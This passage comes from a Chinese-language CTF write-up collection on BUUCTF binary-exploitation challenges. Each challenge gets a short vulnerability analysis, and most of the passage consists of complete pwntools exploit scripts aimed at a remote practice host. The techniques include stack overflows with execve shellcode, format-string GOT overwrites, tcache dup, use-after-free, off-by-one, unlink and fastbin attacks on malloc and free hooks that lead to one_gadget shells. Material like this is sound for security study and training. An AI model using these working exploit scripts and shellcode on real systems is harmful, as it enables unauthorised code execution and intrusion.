delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() win = 0x080485CB offset = 0x28 + 0x4 payload = 'a'*offset + p32(win) sa(':',payload) itr() picoctf_2018_buffer overflow 2类似上题，考个控制传参。 expfrom pwn import * import time local_file = './PicoCTF_2018_buffer_overflow_2' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29988) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() win = 0x80485CB offset = 0x6c + 0x4 payload = 'a'*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE) s(payload) axb_2019_fmt3232位的格式化字符串，考的是单次printf多次写入，因为是32位pwntools的fmtstr_payload是十分好用的。 expfrom pwn import * import time local_file = './axb_2019_fmt32' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29147) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() printf_got = 0x804A014 payload = \"%9$sA\" + p32(0x804A014) sla('me:',payload) ru('Repeater:') printf_got = uu32(r(4)) libc_base = printf_got - 0x049020 info_addr('libc_base',libc_base) offset = 8 rce = libc_base + 0x3a80c info_addr('rec',rce) payload = 'a' + fmtstr_payload(offset,&#123;0x804A014:rce&#125;,write_size = \"byte\",numbwritten = 10) sla('me:',payload) itr() pwnable_start分析32位，无任何保护，作者自己汇编写的程序。分析汇编以后可以认为就是： write(1,esp,20) read(0,esp,60) 十分明显的栈溢出，但是难点在shellcode摆上栈以后，如何跳转过去执行。 利用思路： 利用控制eip，返回wirte处，泄漏一下栈地址，然后根据偏移算出esp的地址 摆shellcode上栈，控制好eip expfrom pwn import * import time local_file = './start' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27834) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() # debug() payload = 'a' * 0x14 + p32(0x08048087) sa(\":\",payload) new_esp = uu32(r(4)) - 4 addr_shellcode = new_esp + 0x14 + 4 info_addr('new esp',new_esp) shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" shellcode += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" shellcode += \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" shellcode += \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" s('a' * 0x14 + p32(addr_shellcode) + shellcode) itr() Shell code 网上一找有很多，找到一个合适字节限制，且可以执行的即可。 inndy_rop做法跟 cmcc_simplerop基本一样，除了偏移。 32位下，sys_execve(&quot;sh&quot;, 0, 0, 0) 行不通。（上来测试这个，测试一阵子） BJDCTF 2nd secret分析慢慢分析可以发现一个溢出点，且利用此处只是可以做到任意地址的数据减1。 然后想到可以在got表处下手，其中printf、system函数在程序达到一定条件才会运行。所以其got处的值是特定的，并且是相近的。 如图所示，相差10。然后利用原来的溢出点，放入printf的got表地址，让其减10次1，也就是答对10次serect后，让程序走向结束处，调用printf。其printf的buf打印的是name，这个是可控的，写成/bin/sh\\x00即可。 expfrom pwn import * import time local_file = './secret' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29635) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() payload = '/bin/sh\\x00' + \"\\x00\" * 8 + p64(elf.got['printf'])[:5] #此处payload 因为read那里读的数据大小限制，需要调整一下payload的长度。 # debug() sla(\"What's your name?\",payload) answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(len(answer)): print(answer[i]) sa(\"Secret\",str(answer[i])) sla(\"Secret\",'1') itr() ciscn_2019_es_1分析64位，ubuntu 18. 存在 UAF，十分简单的tcache dup攻击。 expfrom pwn import * import time local_file = './ciscn_2019_es_1' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29639) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] rce18 = [0x4f2c5,0x4f322,0x10a38c] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): gdb.attach(io) pause() def add(size,name,call): sla('ice:','1') sla('size',str(size)) sa('name',str(name)) sa('call',str(call)) def show(idx): sla('ice','2') sla('dex',str(idx)) def call(idx): sla('ice','3') sla('dex',str(idx)) add(0x500,'chumen77','chumen77') #0 add(0x80,'chumen77','chumen77') #1 # debug() call(0) show(0) ru('name:\\n') libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc',libc_base) #get libc add(0x510-0x20-0x10,'chumen77','chumen77') #2 add(0x20,'chumen77','chumen77') #3 call(3) call(3) free_hook = libc_base + 0x3ed8e8 add(0x20,p64(free_hook),p64(free_hook)) #4 add(0x20,p64(free_hook),p64(free_hook)) #5 rec = rce18[1] + libc_base add(0x20,p64(rec),p64(rec)) call(1) itr() ciscn_2019_s_4分析int vul() &#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(\"Hello, %s\\n\", &amp;s); read(0, &amp;s, 0x30u); return printf(\"Hello, %s\\n\", &amp;s); &#125; 存在栈溢出，溢出8个字节，考虑栈转移。 在填充buf， %s 在32位用于泄漏栈上的信息。 所以可以考虑泄漏处栈地址，libc地址。从而算出buf的base与libc base。 首先可以明确一点可以覆盖返回地址，第一下考虑直接覆盖为one_gadget 本地通远程不通。 然后就考虑用栈转移到buf上来获取shell。 expfrom pwn import * import time local_file = './ciscn_s_4' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',26932) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() payload = 'a' * (0x28 - 1 ) + 'b' sa('name',payload) ru(\"b\") buf_base = uu32(r(4)) - 0x38 r(4) libc_base = uu32(r(4)) - 0x1fb9b0 info_addr('stack',buf_base) info_addr('libc',libc_base) payload = p32(0x8048450) + p32(elf.plt['system']) + p32(0x8048450) + p32(buf_base+16) + '/bin/sh\\x00' payload = payload.ljust((0x30-4-4-8),'b') + p32(buf_base) *3+ p32(0x80485FD) s(payload) itr() ciscn_2019_final_2分析程序很简单，但是也很细节，由于自己的逆向能力有点差，没有注意部分细节，造成构造堆块，进行leak和改写时，造成较大的困难和迷惑。 开启了沙盒不能get shell： # line CODE JT JF K # ================================= # 0000: 0x20 0x00 0x00 0x00000004 A = arch # 0001: 0x15 0x00 0x05 0xc000003e if (A != ARCH_X86_64) goto 0007 # 0002: 0x20 0x00 0x00 0x00000000 A = sys_number # 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 # 0004: 0x15 0x00 0x02 0xffffffff if (A != 0xffffffff) goto 0007 # 0005: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0007 # 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW # 0007: 0x06 0x00 0x00 0x00000000 return KILL 漏洞点 UAF 比如： 程序处：add函数：int *v0; // rbx __int16 v1; // ax v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt; v1 = get_atoi(); *(_WORD *)short_pt = v1; *((_WORD *)short_pt + 4) = *(_WORD *)short_pt; 开始对数据类型的大小没有注意，这几处决定着 int型堆块时，只能写上4字节的数据 short int 型堆块时，只能写上2字节的数据 show函数：if ( v2 == 1 &amp;&amp; int_pt ) printf(\"your int type inode number :%d\\n\", *(unsigned int *)int_pt); if ( v2 == 2 &amp;&amp; short_pt ) printf(\"your short type inode number :%d\\n\", (unsigned int)*(signed __int16 *)short_pt); 意味着leak时也是只能泄漏出部分的字节，增加在利用时的难度，需要利用合适的堆块进行攻击，其合适是指上面有残留合适的数据，然后改末尾几个字节。 预备知识scanf函数是从stdin中读取数据，且在__IO_2_stdio_ 的io结构体存在一个_fileno的标识位，默认值是0，若将其改成其他的文件号，调用scanf函数在获取时，就会获取对应文件。 难点 程序只让你分配0x30或者0x20的堆块，如何伪造出一个至少0x90的堆块，如何释放后，来泄漏libc。 泄漏出来的数据不是完整的，可写时只能写上2、4字节 expfrom pwn import * import time local_file = './ciscn_final_2' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25252) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(type,number): sla('&gt;','1') sla('&gt;',str(type)) sla(\":\",str(number)) def free(type): sla('&gt;','2') sla('&gt;',str(type)) def show(type): sla('&gt;','3') sla('&gt;',str(type)) def leave(): sla('&gt;','4') # sa('?',str(mes)) add(1,1) free(1) #leave chunk 0 add(2,2) add(2,2) add(2,2) # 0x90 #ready to dup add(2,2) free(2) add(1,1) # get chunk0 free(2) #leak heap show(2) ru('number :') chunk0_addr_word = int(ru('\\n')) - 0xa0 info_addr('chunk0_addr',chunk0_addr_word) add(2,chunk0_addr_word) add(2,chunk0_addr_word) add(2,0x91) #fake unsortbin chunk #full tache bins for i in range(7): free(1) add(2,2) #leak libc free(1) show(1) ru('number :') stdin_fillno = int(ru('\\n')) - 0x2a0 + 0x70 info_addr('stdin_fillno',stdin_fillno) #ready to attack stdin_fillno ,use taeche dup add(1,stdin_fillno) add(1,stdin_fillno) free(1) add(2,stdin_fillno) free(1) #leak contains libc's heap show(1) ru('number :') chunk1_addr_dword = int(ru('\\n')) - 0x30 info_addr('chunk1_addr_dword',chunk1_addr_dword) #change the 0x30bins chains add(1,chunk1_addr_dword) add(1,chunk1_addr_dword) add(1,stdin_fillno) #attck the fileno add(1,666) leave() itr() 渣渣英文注释，先不改了。感觉还是挺不容易做的题，堆块如何构造想了老久。到别的师傅那里，归类为简单题。太菜了太菜了，基础还不是很好。 pwnable_hacknote分析简单的uaf 坑点(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); 此处在改完ptr[v1]为system以后，其参数的指针是从这个堆块开始的要提前进行截断。 system(p32(system) + '||sh') system(p32(system) + ';sh;') expfrom pwn import * import time local_file = './hacknote' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) else: io = remote('node3.buuoj.cn',27225) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('size',str(size)) sa('Content',str(data)) def free(idx): sla('choice','2') sla('dex',str(idx)) def show(idx): sla('choice','3') sla('dex',str(idx)) add(0x20,'bbbb') add(0x20,'bbbb') free(0) free(1) add(8,p32(0x0804862B) + p32(elf.got['__libc_start_main'])) show(0) r() libc_base = uu32(r(4)) - 0x18540 info_addr('base',libc_base) free(2) system = 0x0003ada0 + libc_base add(8,p32(system) + '||sh') show(0) itr() Buu远程打不通。。 hitcontraining_heapcreator分析Edit函数处，故意可以多写出一个字节。 off by one expfrom pwn import * import time local_file = './heapcreator' context.log_level = 'debug' elf = ELF(local_file) debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26646) libc = elf.libc # remote_libc = '.' # './libc.so.6' # libc = ELF(remote_libc) context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('Heap',str(size)) sa('heap',str(data)) def edit(idx,data): sla('choice','2') sla('dex',str(idx)) sa('heap',str(data)) def show(idx): sla('choice','3') sla('dex',str(idx)) def free(idx): sla('choice','4') sla('dex',str(idx)) add(0x18,'\\x00') add(0x20,'bbbb') add(0x20,'cccc') add(0x10,'dddd') payload = 0x18 * 'a' + '\\xa1' edit(0,payload) free(1) add(0x10,'\\x78') show(1) ru('Content : ') base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',base) free(1) free_hook = 0x3c67a8 + base paylaod = '\\x00' * 2 * 8 + p64(8) + p64(free_hook) add(0x30,paylaod) rce = base + rce16[1] edit(2,p64(rce)) free(0) itr() 0ctf_2017_babyheap分析保护全开，程序逆向起来看起来很乱，并且堆块定位是通过栈来传参，没有全局指针。 知识点calloc 函数基本跟malloc一样，但是再分配好堆块时，会把分配到的堆块全部清理为0。 影响无法通过传统的unsortbin来leak libc，结合fill函数中的堆溢出即可。 漏洞点Fill 函数中，明显有堆溢出，且十分好用，效果很大。 expfrom pwn import * import time local_file = './0ctf_2017_babyheap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26374) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla('Command','1') sla('Size',str(size)) def fill(idx,size,data): sla('mand','2') sla('dex',str(idx)) sla('ize',str(size)) sa('tent',str(data)) def free(idx): sla('mand','3') sla('dex',str(idx)) def dump(idx): sla('mand','4') sla('dex',str(idx)) add(0x30) #0 add(0x30) #1 add(0x10) #2 add(0x10) #3 add(0x10) #4 add(0x20) #5 payload = 'a' * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4 fill(0,0x60,payload) free(1) add(0x30) dump(2) ru('Content: \\n') base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',base) add(0x50) #6 add(0x60) #7 add(0x60) #8 free(7) free(8) malloc_hook = base + 0x3c4b10 payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) fill(5,len(payload),payload) add(0x60) #7 add(0x60) #8 rec = rce16[1] + base payload = 'a' * 0x13 + p64(rec) fill(8,len(payload),payload) add(0x20) itr() wustctf2020_closedclose(1); close(2); return shell(); 直接就给你shell了，但是stdout已经被关闭了。但是对其文件描述符1进行重定向为没有关闭的0即可。 exec 1&gt;&amp;0 &amp;&amp; cat flag wustctf2020_getshell_2分析ssize_t vulnerable() &#123; char buf; // [esp+0h] [ebp-18h] return read(0, &amp;buf, 0x24u); &#125; 明显可以看出只可以控制2个gadget。优先想到了栈迁移。可是也没有合适地方去迁移利用。 倘若可以控制3个gadget，直接： p32(system.plt) + p32(0xdeadbeef) + p32(sh) 这样就可以拿到shell了。 因为平时rop时，32位下自己十分经常**用函数的plt+返回地址+参数1，造成思路卡顿。 突破但是尝试去看下后门函数： .text:08048521 ; 2: return system(\"/bbbbbbbbin_what_the_f?ck__--??/sh\"); .text:08048521 sub esp, 0Ch .text:08048524 push offset command ; \"/bbbbbbbbin_what_the_f?ck__--??/sh\" .text:08048529 call _system .text:0804852E add esp, 10h .text:08048531 nop .text:08048532 leave .text:08048533 retn 在08048524处，可以看到起其call system前，push offset command，把这个字符串压栈，来作为第一个参数。 那就在溢出时，返回地址填上08048529 ，在自己填上sh的地址即可了。 这样就在call system时，完成的是system(sh)。 其实也是很简单的： 由于因为平时rop时，32位下自己经常用`函数的plt+返回地址+参数1`，造成思路卡顿。 ，其实自己分析以后就是：函数的plt+4字节+参数1。 溢出时，填上p32(0x8048529) + p32(sh)栈信息： 0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;: call 0x80483e0 &lt;system@plt&gt;) 0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 ('sh') 在溢出调用时,ret到： .text:08048529 call _system 其就是 push eip+4 jmp system.plt 然后栈就变成了： =&gt; 0x80483e0 &lt;system@plt&gt;: jmp DWORD PTR ds:0x804a018 | 0x80483e6 &lt;system@plt+6&gt;: push 0x18 | 0x80483eb &lt;system@plt+11&gt;: jmp 0x80483a0 | 0x80483f0 &lt;__libc_start_main@plt&gt;: jmp DWORD PTR ds:0x804a01c | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push 0x20 |-&gt; 0x80483e6 &lt;system@plt+6&gt;: push 0x18 0x80483eb &lt;system@plt+11&gt;: jmp 0x80483a0 0x80483f0 &lt;__libc_start_main@plt&gt;: jmp DWORD PTR ds:0x804a01c 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push 0x20 JUMP is taken [------------------------------------stack-------------------------------------] 0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;: add esp,0x10) 0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 ('sh') 这就变成了，自己熟悉的函数的plt+返回地址+参数1 expfrom pwn import * import time local_file = './wustctf2020_getshell_2' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25032) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] offset = 28 sh = elf.search('sh\\x00').next() system = 0x8048529 payload = 'a' * offset + p32(system) + p32(sh) s(payload) itr() axb_2019_heap分析保护全开。 漏洞点 格式化字符串漏洞，可以泄漏出程序和libc的基址 edit函数中，错误的size选取，导致每次可以多溢出0x10的字节，威力就很大了，prev size与 size都可以改到。 直接进行unlink攻击即可。估计就是考这个的，程序限制了不能申请0x80以下的堆块，且key值基本没办法改到。 expfrom pwn import * import time local_file = './axb_2019_heap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26837) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('&gt;&gt;','1') sla('(0-10)',str(idx)) sla('size',str(size)) sla('content',str(data)) def free(idx): sla('&gt;&gt;','2') sla('dex',str(idx)) def edit(idx,data): sla('&gt;&gt;','4') sla('dex',str(idx)) sla('content',str(data)) payload = '%15$p' + '%11$p' sla('name',payload) ru('Hello, 0x') libc_base = int(r(12),16) - 0x20830 info_addr('libc_base',libc_base) ru('0x') bin_base = int(r(12),16) - 0x1186 info_addr('bin_base',bin_base) note = bin_base + 0x202060 key = bin_base + 0x202040 add(0,0x88,'aaaaaaaa') add(1,0x100,'bbbbbbbb') add(2,0x88,'cccccccc') payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30) payload += p64(0) * 9 + p64(0x80) + p64(0x110) edit(0,payload) free(1) free_hook = 0x3c67a8 + libc_base payload = p64(0) * 3 + p64(free_hook) + p64(0x88) edit(0,payload) rec = rce16[1] + libc_base edit(0,p64(rec)) free(2) itr() hitcontraining_unlink分析Edit函数中，有个大威力的堆溢出。用unlink攻击。 expfrom pwn import * import time local_file = './bamboobox' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26818) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','2') sla('len',str(size)) sa('name',str(data)) def edit(idx,size,data): sla('ice','3') sla('dex',str(idx)) sla('len',str(size)) sa('name',str(data)) def show(): sla('choice','1') def free(idx): sla('ice','4') sla('dex',str(idx)) note = 0x006020C0 + 8 add(0x88,'aaaaaaaa') add(0x100,'bbbbbbbb') add(0x88,'cccccccc') payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30) payload += p64(0) * 9 + p64(0x80) + p64(0x110) edit(0,len(payload),payload) free(1) show() ru('0 : ') libc_base = uu64(r(6)) - 0x3c48e0 info_addr('libc_base',libc_base) free_hook = 0x3c67a8 + libc_base payload = p64(libc_base + 0x3c48e0) + p64(0) + p64(0x88) + p64(free_hook) edit(0,len(payload),payload) rec = rce16[1] + libc_base edit(0,8,p64(rec)) free(2) itr() ciscn_2019_s_9分析32位程序，保护全关，目标定位着shellcode去。 漏洞点栈溢出，可以溢出14个字节，这是32位程序用rop就可以打了。但是为相对麻烦一点。 .text:08048551 hint proc near .text:08048551 ; __unwind &#123; .text:08048551 55 push ebp .text:08048552 89 E5 mov ebp, esp .text:08048554 FF E4 jmp esp .text:08048554 hint endp 在题目当中，有个hint函数，就是给提示的，提示到jmp esp 这个gadget。 其中，可以想到在栈溢出中，有给ret addr填上jmp esp ，在接上shellcode。这应该是很经典的用法。 参考链接：http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/ 构造思路： Payload = overflow + jmp esp address + shellcode 但是这个题就是只能溢出14字节，返回地址再占用4字节，应该没有10字节这样少的shellcode。 所以转变一下，栈上填充好shellcode，然后jmp esp address，接着让其执行sub esp,0x28，然后在跳转esp。 Payload = shellcode + jmp esp address + sub esp,esp + jmp esp 其实基本都是一样的，后面跟上的，也可以理解为调整esp指针的shellcode。 espfrom pwn import * import time local_file = './ciscn_s_9' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26283) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() jmp_esp = 0x08048554 shellcode= '\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80' 